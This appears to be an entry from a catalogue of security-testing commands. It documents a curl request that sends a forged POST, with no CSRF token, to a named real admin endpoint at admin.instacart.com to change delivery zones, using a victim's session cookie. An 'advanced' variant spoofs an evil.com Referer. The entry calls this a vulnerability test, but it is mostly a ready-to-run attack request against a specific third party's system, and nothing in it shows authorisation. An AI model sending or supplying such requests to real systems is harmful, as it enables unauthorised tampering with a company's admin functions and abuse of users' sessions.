---
id: cmd-uuid-1
data: >-
  curl -X POST https://admin.instacart.com/api/v2/zones -d
  "zip=10001&override=true" -b "session_cookie_value"
tags:
  - csrf
  - test
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:50.199Z'
verified: false
validated: true
submitted: true
---
# test-csrf-endpoint-curl

## Command

```bash
curl -X POST https://admin.instacart.com/api/v2/zones -d "zip=10001&override=true" -b "session_cookie_value"
```

## Description

This command tests the CSRF vulnerability by sending a forged POST request to update the Instacart zone without a CSRF token. Use it to verify if the endpoint accepts unauthorized changes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d "zip=10001&override=true"` | Data payload with zip code and override flag | Yes |
| `-b "session_cookie_value"` | Authenticates with victim's session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://admin.instacart.com/api/v2/zones -d "zip=10001&override=true" -b "session_cookie_value"
```

### Advanced Usage

```bash
curl -X POST https://admin.instacart.com/api/v2/zones -d "zip=90210&override=true" -H "Referer: evil.com" -b "session_cookie_value" -v
```

## Expected Output

Successful response: HTTP/1.1 200 OK with JSON indicating zone update. Failure: 403 or 400 if protected.

## Related

- [[Related Procedure: Identify-Instacart-CSRF-Vulnerable-Endpoint]]
